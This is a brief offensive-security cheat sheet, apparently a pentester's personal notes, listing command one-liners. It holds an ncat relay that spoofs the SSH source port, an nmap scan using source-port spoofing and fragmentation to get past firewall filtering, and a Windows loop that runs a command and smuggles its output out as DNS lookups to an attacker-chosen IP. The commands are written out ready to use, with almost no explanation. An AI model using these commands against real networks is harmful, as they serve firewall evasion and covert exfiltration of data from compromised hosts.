# Tricks (TODO Think of some better title)

## Fake Source Port with SSH using NC
`/usr/bin/ncat -l 1234 --sh-exec "ncat <target> <targetport> -p 4444"` With this create a local listener on 1234 that redirects traffic to target from port 4444. We can now ssh to localhost:1234 and land on target from source port 4444.

## Bypass source port filtering on nmap:

`/usr/bin/nmap <rhost> -Pn --source-port=<lport> -f`

## Grep for Ips

`grep -E "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"`

## Backchannel via nslookup

```bash cheat nslookup backchannel via nslookup
for /F "tokens=1,2,3,4,5,6,7,8,9,10" %b in ('<cmd>') do nslookup "~!%b--%c--%d--%e--%f--%g--%h--%i--%j--%k~~" <ip>
``` 


tags: #misc 
